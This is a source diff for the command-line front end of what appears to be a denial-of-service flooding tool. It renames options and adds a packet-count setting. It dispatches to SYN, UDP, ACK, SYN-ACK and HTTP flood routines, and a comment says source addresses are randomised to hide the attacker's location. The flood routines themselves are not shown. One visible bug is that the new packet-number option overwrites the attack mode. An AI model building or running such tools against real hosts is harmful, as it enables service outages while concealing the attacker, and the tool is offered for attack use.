@@ -3,6 +3,7 @@
 #include <signal.h> // for signal
 #include <string.h> // for strncpy
 #include <getopt.h> // for getopt_long
+#include <limits.h>
 
 #include "main.h"
 
@@ -36,6 +37,7 @@ int main(int argc, char *argv[])
 {
     /*
      * main function here, do some parameters parse work
+     * this program must run as root
      */
 
     signal(SIGINT, quit);
@@ -49,42 +51,43 @@ int main(int argc, char *argv[])
     warning("debug mode");
 #endif
 
-    static char *option_string = "u:p:a:t:h";
+    static char *option_string = "u:p:a:n:t:h";
     int option_index = 0;
     int c;
     static struct option long_options[] = {
         {"url", required_argument, NULL, 'u'},
         {"port", required_argument, NULL, 'p'},
-        {"attack-mode", required_argument, NULL, 'a'},
+        {"am", required_argument, NULL, 'a'},
+        {"pn", required_argument, NULL, 'n'},
         {"thread", required_argument, NULL, 't'},
         {"help", no_argument, NULL, 'h'},
-        {"src-addr", required_argument, NULL, 1},
-        {"src-port", required_argument, NULL, 2},
-        {"random-src", no_argument, NULL, 3},
-        {"repeat-times", required_argument, NULL, 4},
-        {"udp-dynamic-packet", no_argument, NULL, 5},
-        {"udp-dynamic-dst-port", no_argument, NULL, 6},
-        {"http-content", required_argument, NULL, 7},
-        {"https-content", required_argument, NULL, 8},
+        {"saddr", required_argument, NULL, 1},
+        {"sport", required_argument, NULL, 2},
+        {"rsrc", no_argument, NULL, 3},
+        {"rt", required_argument, NULL, 4},
+        {"udps", no_argument, NULL, 5},
+        {"udpp", no_argument, NULL, 6},
+        {"https", no_argument, NULL, 7},
+        {"request", required_argument, NULL, 8},
         {0, 0, 0, 0},
     };
 
     char url[MAX_URL_LENGTH] = {'\0'};
     int port = HTTP_PORT_DEFAULT;
     int attack_mode = NON_ATTACK;
+    unsigned int pn = (unsigned int)PACKET_NUMBER_DEFAULT;
 
     char saddr[MAX_IP_LENGTH] = {'\0'};
     strcpy(saddr, ATTACK_SOURCE_IP_DEFAULT);
     int sport = ATTACK_SOURCE_PORT_DEFAULT;
-    int randsaddr = ENABLE; // random source address to hide attacker's location (syn flood)
+    int rdsrc = ENABLE; // random source address to hide attacker's location (syn flood)
     int thread_number = THREAD_NUM_DEFAULT;
-    int rep = RANDOM_SOURCE_ADDRESS_REPETITION_DEFAULT;
-    int udp_dp = DISABLE;
-    int udp_ddp = DISABLE;
-    char http_content[MAX_PATH_LENGTH] = {'\0'};
-    char https_content[MAX_PATH_LENGTH] = {'\0'};
+    int rt = RANDOM_SOURCE_ADDRESS_REPETITION_DEFAULT;
+    int udps = DISABLE;
+    int udpp = DISABLE;
+    int https = HTTP;
+    char request[MAX_PATH_LENGTH] = {'\0'};
 
-    char cc[5] = {'\0'};
     while (1)
     {
         c = getopt_long(argc, argv, option_string, long_options, &option_index);
@@ -108,6 +111,12 @@ int main(int argc, char *argv[])
             else
                 wronginput("-a or --attack-mode"); 
             break;
+        case 'n':
+            if (atol(optarg) != 0)
+                attack_mode = (unsigned int)atol(optarg);
+            else
+                wronginput("-n or --packet-number"); 
+            break;
         case 't':
             if (atoi(optarg) != 0)
                 thread_number = atoi(optarg);
@@ -128,29 +137,28 @@ int main(int argc, char *argv[])
                 wronginput("--src-port");
             break;
         case 3:
-            randsaddr = ENABLE;
+            rdsrc = ENABLE;
             break;
         case 4:
             if (atoi(optarg) != 0)
-                rep = atoi(optarg);
+                rt = atoi(optarg);
             else
                 wronginput("--repeat-times");
             break;
         case 5:
-            udp_dp = ENABLE;
+            udps = ENABLE;
             break;
         case 6:
-            udp_ddp = ENABLE;
+            udpp = ENABLE;
             break;
         case 7:
-            strncpy(http_content, optarg, MAX_PATH_LENGTH);
+            https = HTTPS;
             break;
         case 8:
-            strncpy(https_content, optarg, MAX_PATH_LENGTH);
+            strncpy(request, optarg, MAX_PATH_LENGTH);
             break;
         case '?':
-            sprintf(cc, "%d", c);
-            wronginput(cc);
+            wronginput(NULL);
         }
     }
 
@@ -167,19 +175,19 @@ int main(int argc, char *argv[])
     switch (attack_mode)
     {
     case SYN_FLOOD_ATTACK:
-        syn_flood_attack(url, port, randsaddr, rep, thread_number, saddr, sport);
+        syn_flood_attack(url, port, rdsrc, rt, thread_number, saddr, sport, pn);
         break;
     case UDP_FLOOD_ATTACK:
-        udp_flood_attack(url, port, randsaddr, rep, thread_number, saddr, sport, udp_dp ,udp_ddp);
+        udp_flood_attack(url, port, rdsrc, rt, thread_number, saddr, sport, udps ,udpp);
         break;
     case ACK_FLOOD_ATTACK:
-        ack_flood_attack(url, port ,randsaddr, rep, thread_number, saddr, sport);
+        ack_flood_attack(url, port ,rdsrc, rt, thread_number, saddr, sport, pn);
         break;
     case SYN_ACK_JOINT_FLOOD_ATTACK:
-        syn_ack_joint_flood_attack(url, port, randsaddr, rep, thread_number, saddr, sport);
+        syn_ack_joint_flood_attack(url, port, rdsrc, rt, thread_number, saddr, sport, pn);
         break;
     case HTTP_FLOOD_ATTACK:
-        http_flood_attack(url, port, http_content, https_content, thread_number);
+        http_flood_attack(url, port, request, https, thread_number, pn);
         break;
     default:
         wronginput("-a or --attack-mode");
